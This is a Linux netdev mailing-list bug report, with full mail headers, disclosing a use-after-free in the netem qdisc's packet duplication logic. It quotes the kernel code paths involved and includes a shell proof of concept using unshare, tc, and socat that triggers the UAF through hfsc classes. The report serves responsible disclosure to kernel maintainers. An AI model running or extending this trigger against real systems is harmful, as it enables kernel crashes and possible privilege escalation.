Return-Path: <netdev+bounces-182034-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [IPv6:2604:1380:45d1:ec00::1])
	by mail.lfdr.de (Postfix) with ESMTPS id 6B244A8773F
	for <lists+netdev@lfdr.de>; Mon, 14 Apr 2025 07:34:11 +0200 (CEST)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 646E016EA43
	for <lists+netdev@lfdr.de>; Mon, 14 Apr 2025 05:34:11 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 5980C192D6B;
	Mon, 14 Apr 2025 05:34:07 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=starlabs-sg.20230601.gappssmtp.com header.i=@starlabs-sg.20230601.gappssmtp.com header.b="lYK4HXwG"
X-Original-To: netdev@vger.kernel.org
Received: from mail-ej1-f44.google.com (mail-ej1-f44.google.com [209.85.218.44])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 24C041E485
	for <netdev@vger.kernel.org>; Mon, 14 Apr 2025 05:34:04 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.218.44
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1744608847; cv=none; b=KxwWB64VTorHJw/TPMkEx5lxRrec0mPFaxvbkhEnay0HRjNfnuZkArWK3QBQ2uCc8zRuwTmDWc3fhJeXsrs9Vv/u4sW69ZomSmO4oaUfurfc3MgUOaiWMZ1PYUgHdHnuVE5dWQgvAcbAHLb6nhQl+qVVaJnGXe4zMz1YPO69OEE=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1744608847; c=relaxed/simple;
	bh=+AshV3GTfy7Ee/zIg3BMvn8PNR3U4GrGDPK0mIsZBGk=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=OtT8ELiymC0c66/5ZOnGs7tQk8QxHHTRzE9FW7v2s0DTNOUNBfXyKM/qLx4bDt/OkY0x+x/yR1ueEWW3N166y2BdaeKNFeYAuHQ+dp0RlwKH6eFz85cSzTHNgZdjZ9gS3ca361TNNK+fPtr09Dot/GApiGUjd5lI6AijYepzaQE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=starlabs.sg; spf=pass smtp.mailfrom=starlabs.sg; dkim=pass (2048-bit key) header.d=starlabs-sg.20230601.gappssmtp.com header.i=@starlabs-sg.20230601.gappssmtp.com header.b=lYK4HXwG; arc=none smtp.client-ip=209.85.218.44
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=starlabs.sg
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=starlabs.sg
Received: by mail-ej1-f44.google.com with SMTP id a640c23a62f3a-aaecf50578eso709244066b.2
        for <netdev@vger.kernel.org>; Sun, 13 Apr 2025 22:34:04 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=starlabs-sg.20230601.gappssmtp.com; s=20230601; t=1744608843; x=1745213643; darn=vger.kernel.org;
        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=gDcL1OoXjd0tSFGBRM1WCPF1YNGqKa/9IenL+Wyu8fk=;
        b=lYK4HXwGSvAPymvyjOvO4HLcKqMjdSy6pCXgmryoTjWJnHf38ZFXDDbWCJ4MY8TfMG
         Lb4kvaK7xMNGO9MsZPBu3+TdqnTink4iGSWTcKsMYzuvtLXwI2958ECm7tEeeytIOBzU
         HvhnWefe/4VslTGbQv7PUBTdK2oylRiqXDbMoMTb0Hs85+oy5fb2jgKccEKifXX34CCR
         utiwZaKvnixON1VPL2CCBTuV8LLFXtTytknRq+p0Rv9Ki4nAlNmLxnhckQMcGxNSxIja
         +vQbJ8Z4CxNSNmcrLF6yzxLTJtMRGb4E7KjKTfsMs4n+VJp5X1MHuqGM4INHvMrrobTn
         VhGg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1744608843; x=1745213643;
        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=gDcL1OoXjd0tSFGBRM1WCPF1YNGqKa/9IenL+Wyu8fk=;
        b=TjKP+nomH25tMdQmxKXHB2luhOb2lH1SHuXX15Td938dbTu2RdfiP7LZN/FzsB7quN
         Sib7IYtuloB/wbyJIZdcOlFMJ065kna83a+A2e5b8ZV48+iY8Noxvi9mGkT27s0HKx8e
         bXg4S6sPrbyy33I+uU+993JOYpi/gY45mSo2ol9cL4nZ14vpOaPpqV6wKjkxFFAUEs/u
         58YrZWVGlvwAkDkuxGWBMZWydFtIr7wyPLGDVatm2GSdSsLkhUFkVn7MAtTf/j3R9dKf
         px3Ot4/5tWSsFgAZZrOk2W0kyGCUTOGXEUfDKGkoomd/7v2qQ4DictaoEfwLyOVFYWcj
         lfNA==
X-Gm-Message-State: AOJu0YzYHV+todGykmf2tJehIUW/wvv5at9aTiqGOM0fscygEvPOparr
	ShnBMaURaoH0k/c471qB3HwJNjXLBsmeEu+vSYlxsRX1SvkaSInkIdRwHnLfZszl4ND0rFpODuz
	KIKRtp1PIJdjV8lDsWsCgxk+Uz7nIpoZGcNKjxNkOPqoEI8diqBX0c5+u
X-Gm-Gg: ASbGncuz2TJmv+0vM+Kz/JCZUAzCW0Yz6bb+6XTLBarnKA9dWuNodnem9Ivv/1xkCee
	k4f/xcSN0biGfhwAv4MjPTjQzvEEa2Mb1pXBvgtbUW9EjoEP8FZlqt73dOOVLuIV8aY9TRopsBx
	cc3ozwAJjKDsicxEP15mZaIOXg
X-Google-Smtp-Source: AGHT+IH9np865akse8Jjm0vvh2c2h9DRJtkBegV/MrUlPokc7SWzC9L/q/NPycOuwOHkahWuVx9KZN71uPiIuwR+S8E=
X-Received: by 2002:a17:906:1701:b0:aca:e0b7:de03 with SMTP id
 a640c23a62f3a-acae0b7ded6mr606419266b.16.1744608843035; Sun, 13 Apr 2025
 22:34:03 -0700 (PDT)
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: "Tai, Gerrard" <gerrard.tai@starlabs.sg>
Date: Mon, 14 Apr 2025 13:33:00 +0800
X-Gm-Features: ATxdqUF-V8Mt72uKQp-u-rvx6FEix6KmOQPSBo6PLw_GcrD73WYNkCRfe-bpWVw
Message-ID: <CAHcdcOm+03OD2j6R0=YHKqmy=VgJ8xEOKuP6c7mSgnp-TEJJbw@mail.gmail.com>
Subject: [BUG] net/sched: netem: UAF due to duplication routine
To: netdev@vger.kernel.org
Cc: Willy Tarreau <w@1wt.eu>, Stephen Hemminger <stephen@networkplumber.org>, 
	Jamal Hadi Salim <jhs@mojatatu.com>, Cong Wang <xiyou.wangcong@gmail.com>, jiri@resnulli.us
Content-Type: text/plain; charset="UTF-8"

Hi,

I found a bug in the netem qdisc's packet duplication logic. This can
lead to UAF in classful parents.

In netem_enqueue():

    if (skb2) {
        struct Qdisc *rootq = qdisc_root_bh(sch);
        u32 dupsave = q->duplicate; /* prevent duplicating a dup... */

        q->duplicate = 0;
        rootq->enqueue(skb2, rootq, to_free);                       // [1]
        q->duplicate = dupsave;
        skb2 = NULL;
    }

    qdisc_qstats_backlog_inc(sch, skb);

    cb = netem_skb_cb(skb);

    if (q->gap == 0 || /* not doing reordering */
        q->counter < q->gap - 1 || /* inside last reordering gap */
        q->reorder < get_crandom(&q->reorder_cor, &q->prng)) {

            // [...]

            tfifo_enqueue(skb, sch);                                // [2]


When the netem qdisc tries to duplicate a packet, it enqueues the packet
into the root qdisc ([1]). Subsequently, tfifo_enqueue() is called at [2],
which increases the qdisc's qlen.

Consider when the netem qdisc is a child of a classful parent. For example,
in drr_enqueue(), there is first a check ([3]) if the child qdisc is
empty. Then, it enqueues the packet into the child qdisc ([4]). After the
enqueue succeeds, it activates the newly active child ([5]).

    first = !cl->qdisc->q.qlen;                                     // [3]
    err = qdisc_enqueue(skb, cl->qdisc, to_free);                   // [4]
    if (unlikely(err != NET_XMIT_SUCCESS)) {
        if (net_xmit_drop_count(err)) {
            cl->qstats.drops++;
            qdisc_qstats_drop(sch);
        }
        return err;
    }

    if (first) {                                                    // [5]
        list_add_tail(&cl->alist, &q->active);
        cl->deficit = cl->quantum;
    }

When the parent (drr) receives a packet to enqueue in an empty netem qdisc,
first = true at [3] and the packet is enqueued in netem. In netem, the
packet duplication enqueues the packet in the root qdisc, the parent drr,
again before it calls tfifo_enqueue() ([2]). So, the netem still has
qlen = 0 when the drr_enqueue() logic runs for the second time. This
causes first = true for the duplicate packet as well. Subsequently, both
calls succeed and the new child activation occurs twice at [5].

This 're-entrant' behaviour is present in other classful qdiscs as well.
In some cases, it can confuse a qdisc's internal tracking. Below is a PoC
with a hfsc parent that showcases a UAF scenario.

Proof of concept for UAF:
unshare -rn
$IP link set dev lo up

# setup victim hfsc
$TC qdisc add dev lo handle 1:0 root hfsc
$TC class add dev lo parent 1:0 classid 1:1 hfsc ls m2 10Mbit
$TC qdisc add dev lo parent 1:1 handle 2:0 netem duplicate 100%

$TC class add dev lo parent 1:0 classid 1:2 hfsc ls m2 10Mbit
$TC qdisc add dev lo parent 1:2 handle 3:0 netem duplicate 100%

echo "" | $SOCAT -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10001))

# delete class 1:1
$TC class del dev lo classid 1:1

# UAF, hfsc tries to dequeue from class 1:1
echo "" | $SOCAT -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10002))


This should give a UAF splat when the kernel is compiled with KASAN.

Unfortunately, I don't have any great ideas regarding a patch.

Thanks!
Gerrard Tai

